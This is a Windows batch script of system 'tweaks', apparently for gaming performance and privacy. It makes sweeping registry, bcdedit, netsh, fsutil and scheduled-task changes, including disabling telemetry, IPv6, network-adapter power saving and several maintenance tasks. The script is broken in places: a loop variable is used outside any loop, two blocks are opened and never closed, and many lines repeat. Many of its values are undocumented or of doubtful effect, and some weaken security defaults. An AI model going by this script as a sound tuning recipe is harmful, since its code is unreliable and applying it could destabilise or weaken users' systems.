Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\CloudContent" /v "DisableWindowsConsumerFeatures" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Credssp" /v "DebugLogLevel" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\Maintenance" /v "MaintenanceDisabled" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile" /v "NoLazyMode" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile" /v "AlwaysOn" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Search" /v "BingSearchEnabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\Software\Microsoft\InputPersonalization" /v "RestrictImplicitInkCollection" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\Software\Microsoft\InputPersonalization" /v "RestrictImplicitTextCollection" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\Software\Microsoft\Personalization\Settings" /v "AcceptedPrivacyPolicy" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Search" /v "CortanaCapabilities" /t REG_SZ /d "" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Search" /v "IsAssignedAccess" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Search" /v "IsWindowsHelloActive" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Windows Search" /v "AllowSearchToUseLocation" /t REG_DWORD /d 0 /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Windows Search" /v "ConnectedSearchPrivacy" /t REG_DWORD /d 3 /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Windows Search" /v "ConnectedSearchSafeSearch" /t REG_DWORD /d 3 /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Windows Search" /v "ConnectedSearchUseWeb" /t REG_DWORD /d 0 /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Windows Search" /v "ConnectedSearchUseWebOverMeteredConnections" /t REG_DWORD /d 0 /f
Reg.exe add "HKLM\Software\Microsoft\PolicyManager\default\Experience\AllowCortana" /v "value" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\Software\Policies\Microsoft\SearchCompanion" /v "DisableContentFileUpdates" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\Software\Policies\Microsoft\Windows\Windows Search" /v "AllowCloudSearch" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\Software\Policies\Microsoft\Windows\Windows Search" /v "AllowCortanaAboveLock" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\Software\Policies\Microsoft\Windows\Windows Search" /v "AllowSearchToUseLocation" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\Software\Policies\Microsoft\Windows\Windows Search" /v "ConnectedSearchPrivacy" /t REG_DWORD /d "3" /f
Reg.exe add "HKLM\Software\Policies\Microsoft\Windows\Windows Search" /v "ConnectedSearchUseWeb" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\Software\Policies\Microsoft\Windows\Windows Search" /v "ConnectedSearchUseWebOverMeteredConnections" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\Software\Policies\Microsoft\Windows\Windows Search" /v "DisableWebSearch" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\Software\Policies\Microsoft\Windows\Windows Search" /v "DoNotUseWebResults" /t REG_DWORD /d "1" /f
fsutil behavior set memoryusage 2
fsutil behavior set mftzone 4
fsutil behavior set disablelastaccess 1
fsutil behavior set disabledeletenotify 0
fsutil behavior set encryptpagingfile 0
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\0000" /v "D3PCLatency" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\0000" /v "F1TransitionLatency" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\0000" /v "LOWLATENCY" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\0000" /v "Node3DLowLatency" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\0000" /v "PciLatencyTimerControl" /t REG_DWORD /d "20" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\0000" /v "RMDeepL1EntryLatencyUsec" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\0000" /v "RmGspcMaxFtuS" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\0000" /v "RmGspcMinFtuS" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\0000" /v "RmGspcPerioduS" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\0000" /v "RMLpwrEiIdleThresholdUs" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\0000" /v "RMLpwrGrIdleThresholdUs" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\0000" /v "RMLpwrGrRgIdleThresholdUs" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\0000" /v "RMLpwrMsIdleThresholdUs" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\0000" /v "VRDirectFlipDPCDelayUs" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\0000" /v "VRDirectFlipTimingMarginUs" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\0000" /v "VRDirectJITFlipMsHybridFlipDelayUs" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\0000" /v "vrrCursorMarginUs" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\0000" /v "vrrDeflickerMarginUs" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\0000" /v "vrrDeflickerMaxUs" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\System\CurrentControlSet\Services\LanManServer\Parameters" /v "DisableCompression" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\lsass.exe" /v "AuditLevel" /t REG_DWORD /d "8" /f
Reg.exe add "HKLM\Software\Policies\Microsoft\Windows\CredentialsDelegation" /v "AllowProtectedCreds" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Lsa" /v "DisableRestrictedAdminOutboundCreds" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Lsa" /v "DisableRestrictedAdmin" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Lsa" /v "RunAsPPL" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\SecurityProviders\WDigest" /v "Negotiate" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\SecurityProviders\WDigest" /v "UseLogonCredential" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Games" /v "FpsAll" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Games" /v "FpsStatusGames" /t REG_DWORD /d "10" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Games" /v "FpsStatusGamesAll" /t REG_DWORD /d "4" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Games" /v "GameFluidity" /t REG_DWORD /d "1" /f
POWERSHELL "Disable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol"
POWERSHELL "Disable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol-Client"
POWERSHELL "Disable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol-Server"
POWERSHELL "Set-SmbClientConfiguration -RequireSecuritySignature $True -Force"
POWERSHELL "Set-SmbClientConfiguration -EnableSecuritySignature $True -Force"
POWERSHELL "Set-SmbServerConfiguration -EncryptData $True -Force"
POWERSHELL "Set-SmbServerConfiguration -EnableSMB1Protocol $false -Force"
bcdedit /set configaccesspolicy Default
bcdedit /set MSI Default
bcdedit /set usephysicaldestination No
bcdedit /set usefirmwarepcisettings No
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Serialize" /v "StartupDelayInMSec" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\DXGKrnl" /v "MonitorLatencyTolerance" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\DXGKrnl" /v "MonitorRefreshLatencyTolerance" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\PolicyManager\default\ApplicationManagement\AllowGameDVR" /v "value" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\System\GameConfigStore" /v "GameDVR_Enabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\System\GameConfigStore" /v "GameDVR_FSEBehaviorMode" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\System\GameConfigStore" /v "GameDVR_HonorUserFSEBehaviorMode" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\System\GameConfigStore" /v "GameDVR_DXGIHonorFSEWindowsCompatible" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\System\GameConfigStore" /v "GameDVR_EFSEFeatureFlags" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\GameDVR" /v "AllowGameDVR" /t REG_SZ /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\PolicyManager\default\ApplicationManagement\AllowGameDVR" /v "value" /t REG_SZ /d "00000000" /f
Reg.exe add "HKCU\Software\Microsoft\GameBar" /v "UseNexusForGameBarEnabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\GameDVR" /v "AppCaptureEnabled" /t REG_DWORD /d "0" /f
schtasks /Change /TN "Microsoft\Windows\Application Experience\ProgramDataUpdater" /Disable
schtasks /Change /TN "Microsoft\Windows\Autochk\Proxy" /Disable
schtasks /Change /TN "Microsoft\Windows\Customer Experience Improvement Program\Consolidator" /Disable
schtasks /Change /TN "Microsoft\Windows\Customer Experience Improvement Program\UsbCeip" /Disable
schtasks /Change /TN "Microsoft\Windows\Defrag\ScheduledDefrag" /Disable
schtasks /Change /TN "Microsoft\Windows\Device Information\Device" /Disable
schtasks /Change /TN "Microsoft\Windows\Device Information\Device User" /Disable
schtasks /Change /TN "Microsoft\Windows\DiskDiagnostic\Microsoft-Windows-DiskDiagnosticDataCollector" /Disable
schtasks /Change /TN "Microsoft\Windows\DiskFootprint\Diagnostics" /Disable
schtasks /Change /TN "Microsoft\Windows\DiskFootprint\StorageSense" /Disable
schtasks /Change /TN "Microsoft\Windows\DUSM\dusmtask" /Disable
schtasks /Change /TN "Microsoft\Windows\EnterpriseMgmt\MDMMaintenenceTask" /Disable
schtasks /Change /TN "Microsoft\Windows\Feedback\Siuf\DmClient" /Disable
schtasks /Change /TN "Microsoft\Windows\Input\TouchpadSyncDataAvailable" /Disable
schtasks /Change /TN "Microsoft\Windows\International\Synchronize Language Settings" /Disable
schtasks /Change /TN "Microsoft\Windows\LanguageComponentsInstaller\Installation" /Disable
schtasks /Change /TN "Microsoft\Windows\LanguageComponentsInstaller\ReconcileLanguageResources" /Disable
schtasks /Change /TN "Microsoft\Windows\LanguageComponentsInstaller\Uninstallation" /Disable
schtasks /Change /TN "Microsoft\Windows\License Manager\TempSignedLicenseExchange" /Disable
schtasks /Change /TN "Microsoft\Windows\License Manager\TempSignedLicenseExchange" /Disable
schtasks /Change /TN "Microsoft\Windows\Maintenance\WinSAT" /Disable
schtasks /Change /TN "Microsoft\Windows\Maps\MapsToastTask" /Disable
schtasks /Change /TN "Microsoft\Windows\Maps\MapsUpdateTask" /Disable
schtasks /Change /TN "Microsoft\Windows\Mobile Broadband Accounts\MNO Metadata Parser" /Disable
schtasks /Change /TN "Microsoft\Windows\MUI\LPRemove" /Disable
schtasks /Change /TN "Microsoft\Windows\NetTrace\GatherNetworkInfo" /Disable
schtasks /Change /TN "Microsoft\Windows\PI\Sqm-Tasks" /Disable
schtasks /Change /TN "Microsoft\Windows\Power Efficiency Diagnostics\AnalyzeSystem" /Disable
schtasks /Change /TN "Microsoft\Windows\PushToInstall\Registration" /Disable
schtasks /Change /TN "Microsoft\Windows\Ras\MobilityManager" /Disable
schtasks /Change /TN "Microsoft\Windows\Feedback\Siuf\DmClientOnScenarioDownload" /Disable
schtasks /Change /TN "Microsoft\Windows\Flighting\FeatureConfig\ReconcileFeatures" /Disable
schtasks /Change /TN "Microsoft\Windows\Flighting\FeatureConfig\UsageDataFlushing" /Disable
schtasks /Change /TN "Microsoft\Windows\Flighting\FeatureConfig\UsageDataReporting" /Disable
schtasks /Change /TN "Microsoft\Windows\Flighting\OneSettings\RefreshCache" /Disable
schtasks /Change /TN "Microsoft\Windows\Input\LocalUserSyncDataAvailable" /Disable
schtasks /Change /TN "Microsoft\Windows\Setup\SetupCleanupTask" /Disable
schtasks /Change /TN "Microsoft\Windows\Setup\SnapshotCleanupTask" /Disable
schtasks /Change /TN "Microsoft\Windows\SpacePort\SpaceAgentTask" /Disable
schtasks /Change /TN "Microsoft\Windows\SpacePort\SpaceManagerTask" /Disable
schtasks /Change /TN "Microsoft\Windows\Speech\SpeechModelDownloadTask" /Disable
cls
PowerShell Disable-NetAdapterLso -Name "*"
powershell "ForEach($adapter In Get-NetAdapter){Disable-NetAdapterPowerManagement -Name $adapter.Name -ErrorAction SilentlyContinue}"
powershell "ForEach($adapter In Get-NetAdapter){Disable-NetAdapterLso -Name $adapter.Name -ErrorAction SilentlyContinue}"
netsh interface teredo set state disabled
netsh interface 6to4 set state disabled
netsh winsock reset
netsh int isatap set state disable
netsh int ip set global taskoffload=enabled
netsh int ip set global neighborcachelimit=4096
netsh int tcp set global timestamps=disabled
netsh int tcp set heuristics disabled
netsh int tcp set global autotuninglevel=normal
netsh int tcp set global congestionprovider=ctcp
netsh int tcp set supplemental Internet congestionprovider=CTCP
netsh int tcp set global chimney=disabled
netsh int tcp set global ecncapability=disabled
netsh int tcp set global rss=enabled
netsh int tcp set global rsc=disabled
netsh int tcp set global dca=enabled
netsh int tcp set global netdma=enabled
netsh int tcp set global nonsackrttresiliency=disabled
netsh int tcp set security mpp=disabled
netsh int tcp set security profiles=disabled
cls
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "EnableICMPRedirect" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "EnablePMTUDiscovery" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "Tcp1323Opts" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpMaxDupAcks" /t REG_DWORD /d "2" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpTimedWaitDelay" /t REG_DWORD /d "32" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "GlobalMaxTcpWindowSize" /t REG_DWORD /d "8760" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpWindowSize" /t REG_DWORD /d "8760" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "MaxConnectionsPerServer" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "MaxUserPort" /t REG_DWORD /d "65534" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "SackOpts" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "DefaultTTL" /t REG_DWORD /d "64" /f
Reg.exe add "%%n" /v "AutoPowerSaveModeEnabled" /t REG_SZ /d "0" /f
Reg.exe add "%%n" /v "AutoDisableGigabit" /t REG_SZ /d "0" /f
Reg.exe add "%%n" /v "AdvancedEEE" /t REG_SZ /d "0" /f
Reg.exe add "%%n" /v "DisableDelayedPowerUp" /t REG_SZ /d "2" /f
Reg.exe add "%%n" /v "*EEE" /t REG_SZ /d "0" /f
Reg.exe add "%%n" /v "EEE" /t REG_SZ /d "0" /f
Reg.exe add "%%n" /v "EnablePME" /t REG_SZ /d "0" /f
Reg.exe add "%%n" /v "EEELinkAdvertisement" /t REG_SZ /d "0" /f
Reg.exe add "%%n" /v "EnableGreenEthernet" /t REG_SZ /d "0" /f
Reg.exe add "%%n" /v "EnableSavePowerNow" /t REG_SZ /d "0" /f
Reg.exe add "%%n" /v "EnablePowerManagement" /t REG_SZ /d "0" /f
Reg.exe add "%%n" /v "EnableDynamicPowerGating" /t REG_SZ /d "0" /f
Reg.exe add "%%n" /v "EnableConnectedPowerGating" /t REG_SZ /d "0" /f
Reg.exe add "%%n" /v "EnableWakeOnLan" /t REG_SZ /d "0" /f
Reg.exe add "%%n" /v "GigaLite" /t REG_SZ /d "0" /f
Reg.exe add "%%n" /v "NicAutoPowerSaver" /t REG_SZ /d "2" /f
Reg.exe add "%%n" /v "PowerDownPll" /t REG_SZ /d "0" /f
Reg.exe add "%%n" /v "PowerSavingMode" /t REG_SZ /d "0" /f
Reg.exe add "%%n" /v "ReduceSpeedOnPowerDown" /t REG_SZ /d "0" /f
Reg.exe add "%%n" /v "S5NicKeepOverrideMacAddrV2" /t REG_SZ /d "0" /f
Reg.exe add "%%n" /v "S5WakeOnLan" /t REG_SZ /d "0" /f
Reg.exe add "%%n" /v "ULPMode" /t REG_SZ /d "0" /f
Reg.exe add "%%n" /v "WakeOnDisconnect" /t REG_SZ /d "0" /f
Reg.exe add "%%n" /v "*WakeOnMagicPacket" /t REG_SZ /d "0" /f
Reg.exe add "%%n" /v "*WakeOnPattern" /t REG_SZ /d "0" /f
Reg.exe add "%%n" /v "AutoDisableGigabit" /t REG_SZ /d "0" /f 
Reg.exe add "%%n" /v "AdvancedEEE" /t REG_SZ /d "0" /f 
Reg.exe add "%%n" /v "GigaLite" /t REG_SZ /d "0" /f 
Reg.exe add "%%n" /v "NicAutoPowerSaver" /t REG_SZ /d "2" /f 
Reg.exe add "%%n" /v "PowerDownPll" /t REG_SZ /d "0" /f 
Reg.exe add "%%n" /v "PowerSavingMode" /t REG_SZ /d "0" /f 
Reg.exe add "%%n" /v "ReduceSpeedOnPowerDown" /t REG_SZ /d "0" /f 
Reg.exe add "%%n" /v "S5NicKeepOverrideMacAddrV2" /t REG_SZ /d "0" /f 
Reg.exe add "%%n" /v "S5WakeOnLan" /t REG_SZ /d "0" /f 
Reg.exe add "%%n" /v "ULPMode" /t REG_SZ /d "0" /f 
Reg.exe add "%%n" /v "WakeOnDisconnect" /t REG_SZ /d "0" /f 
Reg.exe add "%%n" /v "*WakeOnMagicPacket" /t REG_SZ /d "0" /f 
Reg.exe add "%%n" /v "*WakeOnPattern" /t REG_SZ /d "0" /f 
Reg.exe add "%%n" /v "WakeOnLink" /t REG_SZ /d "0" /f 
Reg.exe add "%%n" /v "WolShutdownLinkSpeed" /t REG_SZ /d "2" /f 
Reg.exe add "%%n" /v "JumboPacket" /t REG_SZ /d "1514" /f 
Reg.exe add "%%n" /v "TransmitBuffers" /t REG_SZ /d "4096" /f 
Reg.exe add "%%n" /v "ReceiveBuffers" /t REG_SZ /d "512" /f 
Reg.exe add "%%n" /v "IPChecksumOffloadIPv4" /t REG_SZ /d "0" /f 
Reg.exe add "%%n" /v "LsoV1IPv4" /t REG_SZ /d "0" /f  
Reg.exe add "%%n" /v "LsoV2IPv4" /t REG_SZ /d "0" /f 
Reg.exe add "%%n" /v "LsoV2IPv6" /t REG_SZ /d "0" /f 
Reg.exe add "%%n" /v "PMARPOffload" /t REG_SZ /d "0" /f 
Reg.exe add "%%n" /v "PMNSOffload" /t REG_SZ /d "0" /f 
Reg.exe add "%%n" /v "TCPChecksumOffloadIPv4" /t REG_SZ /d "0" /f 
Reg.exe add "%%n" /v "TCPChecksumOffloadIPv6" /t REG_SZ /d "0" /f 
Reg.exe add "%%n" /v "UDPChecksumOffloadIPv6" /t REG_SZ /d "0" /f 
Reg.exe add "%%n" /v "UDPChecksumOffloadIPv4" /t REG_SZ /d "0" /f 
Reg.exe add "%%n" /v "RSS" /t REG_SZ /d "1" /f 
Reg.exe add "%%n" /v "*NumRssQueues" /t REG_SZ /d "2" /f 
Reg.exe add "%%n" /v "RSSProfile" /t REG_SZ /d "3" /f 
Reg.exe add "HKLM\System\CurrentControlSet\Control\Nsi\{eb004a03-9b1a-11d4-9123-0050047759bc}\0" /v "0200" /t REG_BINARY /d "0000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000ff000000000000000000000000000000000000000000ff000000000000000000000000000000" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\Nsi\{eb004a03-9b1a-11d4-9123-0050047759bc}\0" /v "1700" /t REG_BINARY /d "0000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000ff000000000000000000000000000000000000000000ff000000000000000000000000000000" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Winsock" /v "MinSockAddrLength" /t REG_DWORD /d "16" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Winsock" /v "MaxSockAddrLength" /t REG_DWORD /d "16" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpTimedWaitDelay" /t REG_DWORD /d "32" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "GlobalMaxTcpWindowSize" /t REG_DWORD /d "8760" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpWindowSize" /t REG_DWORD /d "8760" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "MaxConnectionsPerServer" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "MaxUserPort" /t REG_DWORD /d "65534" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "SackOpts" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "DefaultTTL" /t REG_DWORD /d "64" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "DelayedAckFrequency" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "DelayedAckTicks" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "CongestionAlgorithm" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "MultihopSets" /t REG_DWORD /d "15" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "FastCopyReceiveThreshold" /t REG_DWORD /d "16384" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "FastSendDatagramThreshold" /t REG_DWORD /d "16384" /f
for /f %%q in ('wmic path win32_networkadapter get GUID ^| findstr "{"') do Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\%%q" /v InterfaceMetric /t REG_DWORD /d 0000055 /f
for /f %%q in ('wmic path win32_networkadapter get GUID ^| findstr "{"') do Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\%%q" /v TCPNoDelay /t REG_DWORD /d 0000001 /f
for /f %%q in ('wmic path win32_networkadapter get GUID ^| findstr "{"') do Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\%%q" /v TcpAckFrequency /t REG_DWORD /d 0000001 /f
for /f %%q in ('wmic path win32_networkadapter get GUID ^| findstr "{"') do Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\%%q" /v TcpDelAckTicks /t REG_DWORD /d 0000000 /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces" /v "TCPDelAckTicks" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TCPDelAckTicks" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TCPNoDelay" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces" /v "TCPNoDelay" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\MSMQ\Parameters" /v "TCPNoDelay" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpAckFrequency" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces" /v "TcpAckFrequency" /t REG_DWORD /d "1" /f
netsh int tcp set global dca=enabled
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\ServiceProvider" /v "LocalPriority" /t REG_DWORD /d "4" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\ServiceProvider" /v "HostsPriority" /t REG_DWORD /d "5" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\ServiceProvider" /v "DnsPriority" /t REG_DWORD /d "6" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\ServiceProvider" /v "NetbtPriority" /t REG_DWORD /d "7" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces" /v "DisableTaskOffload" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "DisableTaskOffload" /t REG_DWORD /d "0" /f
for /f %%i in ('wmic path win32_NetworkAdapter get PNPDeviceID') do set "str=%%i" & (
netsh int ipv6 set state disabled
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\services\LanmanServer\Parameters" /v "autodisconnect" /t REG_DWORD /d "4294967295" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\services\LanmanServer\Parameters" /v "Size" /t REG_DWORD /d "3" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\services\LanmanServer\Parameters" /v "EnableOplocks" /t REG_DWORD /d "0" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\services\LanmanServer\Parameters" /v "IRPStackSize" /t REG_DWORD /d "20" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\services\LanmanServer\Parameters" /v "SharingViolationDelay" /t REG_DWORD /d "0" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\services\LanmanServer\Parameters" /v "SharingViolationRetries" /t REG_DWORD /d "0" /f 
for /f %%n in ('wmic path win32_networkadapter get PNPDeviceID ^| findstr /L "VEN_"') do (
Reg.exe ADD "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Enum\%%n\Device Parameters\Interrupt Management\Affinity Policy" /v "AssignmentSetOverride" /t REG_BINARY /d "04" /f
Reg.exe ADD "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Enum\%%n\Device Parameters\Interrupt Management\Affinity Policy" /v "DevicePolicy" /t REG_DWORD /d "4" /f
